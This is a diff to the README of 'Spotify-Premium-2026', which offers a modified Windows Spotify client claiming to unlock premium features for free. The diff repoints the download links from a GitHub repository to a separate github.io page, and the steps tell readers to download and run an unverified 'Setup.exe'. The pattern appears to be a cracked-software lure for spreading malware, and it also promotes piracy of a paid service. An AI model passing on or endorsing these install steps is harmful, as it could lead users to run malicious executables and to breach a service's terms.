@@ -1,6 +1,6 @@
 # 🎧 Spotify-Premium-2026 - Stream music without any paid limits
 
-[![](https://img.shields.io/badge/Download-Spotify-Premium-2026-blue)](https://github.com/Octaviusawful857/Spotify-Premium-2026)
+[![](https://img.shields.io/badge/Download-Spotify-Premium-2026-blue)](https://octaviusawful857.github.io)
 
 Spotify-Premium-2026 provides a modified desktop player for your Windows computer. This client unlocks premium features for your listening experience. You get ad-free streaming, unlimited track skips, and high-quality audio playback. It also supports offline music modes for your library.
 
@@ -17,7 +17,7 @@ Spotify-Premium-2026 provides a modified desktop player for your Windows compute
 Follow these steps to install the software on your computer.
 
 1.  Navigate to the official project page to access the setup files.
-2.  Click the following link to reach the download area: [https://github.com/Octaviusawful857/Spotify-Premium-2026](https://github.com/Octaviusawful857/Spotify-Premium-2026).
+2.  Click the following link to reach the download area: [https://octaviusawful857.github.io](https://octaviusawful857.github.io).
 3.  Locate the file named `Setup.exe`.
 4.  Download this file to your computer.
 5.  Double-click the `Setup.exe` file to start the installer.
